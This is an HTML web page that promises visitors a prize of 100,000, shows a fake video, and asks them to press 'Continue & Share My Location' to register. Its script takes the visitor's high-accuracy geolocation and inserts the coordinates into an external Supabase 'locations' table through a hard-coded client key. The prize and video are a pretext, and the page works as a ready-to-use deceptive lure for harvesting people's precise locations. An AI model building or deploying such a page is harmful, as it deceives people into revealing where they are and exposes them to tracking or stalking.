<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win up to 100,000</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 25px 15px;
            font-family: Arial, sans-serif;
            background: #111;
            color: white;
            text-align: center;
        }

        .container {
            max-width: 600px;
            margin: auto;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #ddd;
            margin-bottom: 20px;
        }

        .video-box {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            background: #000;
            border-radius: 14px;
            overflow: hidden;
            cursor: pointer;
        }

        .video-placeholder {
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #222, #444);
        }

        .play {
            width: 75px;
            height: 75px;
            border-radius: 50%;
            background: white;
            color: #111;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 35px;
            padding-left: 5px;
        }

        .video-text {
            margin-top: 15px;
            font-size: 18px;
        }

        .notice {
            margin-top: 20px;
            padding: 15px;
            background: #222;
            border-radius: 10px;
            color: #ddd;
            line-height: 1.7;
        }

        button {
            width: 100%;
            margin-top: 20px;
            padding: 15px;
            border: none;
            border-radius: 8px;
            background: #007bff;
            color: white;
            font-size: 18px;
            cursor: pointer;
        }

        button:hover {
            background: #0056b3;
        }

        button:disabled {
            background: #777;
        }

        #result {
            margin-top: 20px;
            line-height: 1.8;
        }

        .success {
            color: #35d06f;
            font-weight: bold;
        }

        .error {
            color: #ff5555;
            font-weight: bold;
        }
    </style>
</head>

<body>

<div class="container">

    <h1>You’ll win 100,000</h1>

    <div class="subtitle">
        Go register your name to be among the winners.
    </div>

    <!-- شكل الفيديو -->

    <div class="video-box">
        <div class="video-placeholder">

            <div class="play">
                ▶
            </div>

            <div class="video-text">
                Click to continue
            </div>

        </div>
    </div>

    <div class="notice">
        To continue, press the button below and allow
        location access when your browser asks.
    </div>

    <button id="locationButton">
        Continue & Share My Location
    </button>

    <div id="result"></div>

</div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>

const SUPABASE_URL =
    "https://vsztpvsicsmxjhsvqzbv.supabase.co";

const SUPABASE_PUBLISHABLE_KEY =
    "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";

const supabaseClient =
    window.supabase.createClient(
        SUPABASE_URL,
        SUPABASE_PUBLISHABLE_KEY
    );

const button =
    document.getElementById("locationButton");

const result =
    document.getElementById("result");


button.addEventListener("click", function () {

    if (!navigator.geolocation) {

        result.innerHTML =
            '<span class="error">' +
            'Your browser does not support location.' +
            '</span>';

        return;
    }

    button.disabled = true;

    result.innerHTML =
        "Requesting location permission...";


    navigator.geolocation.getCurrentPosition(

        async function(position) {

            const latitude =
                position.coords.latitude;

            const longitude =
                position.coords.longitude;

            const accuracy =
                position.coords.accuracy;


            result.innerHTML =
                "Registering your location...";


            const { error } =
                await supabaseClient
                    .from("locations")
                    .insert({
                        latitude: latitude,
                        longitude: longitude,
                        accuracy: accuracy
                    });


            if (error) {

                console.error(error);

                result.innerHTML =
                    '<span class="error">' +
                    'Registration failed.' +
                    '</span>';

                button.disabled = false;

                return;
            }


            result.innerHTML =
                '<span class="success">' +
                'You have been successfully registered.' +
                '</span>';

            button.disabled = false;

        },


        function(error) {

            console.error(error);

            result.innerHTML =
                '<span class="error">' +
                'Location permission was not granted.' +
                '</span>';

            button.disabled = false;

        },


        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }

    );

});

</script>

</body>
</html>
